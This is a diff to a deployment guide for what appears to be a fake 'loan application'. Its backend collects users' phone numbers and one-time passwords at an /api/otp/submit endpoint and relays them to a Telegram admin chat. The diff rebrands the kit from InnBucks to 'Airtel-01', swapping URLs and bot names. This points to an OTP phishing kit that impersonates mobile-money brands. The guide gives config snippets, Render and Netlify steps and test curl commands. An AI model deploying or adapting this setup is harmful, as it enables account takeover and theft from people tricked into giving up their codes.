@@ -12,7 +12,7 @@ Before deployment, set the backend URL in your frontend. Add this to `index.html
 
 ```javascript
 // Set backend URL (on index.html or config file)
-localStorage.setItem("backendUrl", "https://your-backend-on-render.com");
+localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
 ```
 
 Or dynamically detect environment:
@@ -21,7 +21,7 @@ Or dynamically detect environment:
 const isDevelopment = window.location.hostname === "localhost";
 const backendUrl = isDevelopment
   ? "http://localhost:3000"
-  : "https://your-backend-on-render.com";
+  : "https://airtel-01.onrender.com";
 localStorage.setItem("backendUrl", backendUrl);
 ```
 
@@ -58,7 +58,7 @@ In Render dashboard, add:
 TELEGRAM_BOT_TOKEN=123456789:ABCdefGHijKLmNoPqRstuvWXyz
 TELEGRAM_ADMIN_CHAT_ID=987654321
 TELEGRAM_CALLBACK_TOKEN=your_secret_123
-BACKEND_URL=https://innbucks-otp-backend.onrender.com
+BACKEND_URL=https://airtel-01.onrender.com
 PORT=3000
 ```
 
@@ -70,7 +70,7 @@ Push to main branch to auto-deploy:
 git push origin main
 ```
 
-✅ Backend URL: `https://innbucks-otp-backend.onrender.com`
+✅ Backend URL: `https://airtel-01.onrender.com`
 
 ---
 
@@ -109,7 +109,7 @@ Create `config.js` in frontend root:
 ```javascript
 // config.js
 const CONFIG = {
-  BACKEND_URL: "https://innbucks-otp-backend.onrender.com",
+  BACKEND_URL: "https://airtel-01.onrender.com",
   ENV: "production",
 };
 ```
@@ -127,7 +127,7 @@ OR add to `loan5.html`:
 
 ```javascript
 // At the very top of the script section
-const BACKEND_URL = "https://innbucks-otp-backend.onrender.com";
+const BACKEND_URL = "https://airtel-01.onrender.com";
 localStorage.setItem("backendUrl", BACKEND_URL);
 ```
 
@@ -142,8 +142,8 @@ localStorage.setItem("backendUrl", BACKEND_URL);
 ```
 Open Telegram → Search @BotFather
 /newbot
-Name: InnBucks OTP Bot
-Username: innbucks_otp_bot
+Name: Airtel‑01 OTP Bot
+Username: airtel_otp_bot
 ```
 
 Copy the **Bot Token**: `123456789:ABCdefGHijKLmNoPqRstuvWXyz`
@@ -208,7 +208,7 @@ app.use(cors(corsOptions));
 Frontend sets dynamically:
 
 ```javascript
-localStorage.setItem("backendUrl", "https://your-backend.com");
+localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
 ```
 
 ---
@@ -218,7 +218,7 @@ localStorage.setItem("backendUrl", "https://your-backend.com");
 ### 1. Test Backend Health
 
 ```bash
-curl https://innbucks-otp-backend.onrender.com/api/health
+curl https://airtel-01.onrender.com/api/health
 # Should return: {"status":"ok","service":"OTP Backend"}
 ```
 
@@ -248,7 +248,7 @@ Visit: `https://your-site.netlify.app`
 # Check logs on Render dashboard
 # Verify environment variables are set
 # Test endpoint manually:
-curl -X POST https://your-backend.onrender.com/api/otp/submit \
+curl -X POST https://airtel-01.onrender.com/api/otp/submit \
   -H "Content-Type: application/json" \
   -d '{"phone":"+263712345678","otp":"12345","userId":"test"}'
 ```
@@ -319,7 +319,7 @@ If issues arise:
 
 ## 🎉 Deployment Complete!
 
-Your InnBucks loan application is now live with:
+Your loan application is now live with:
 
 - ✅ Frontend on Netlify
 - ✅ Backend on Render
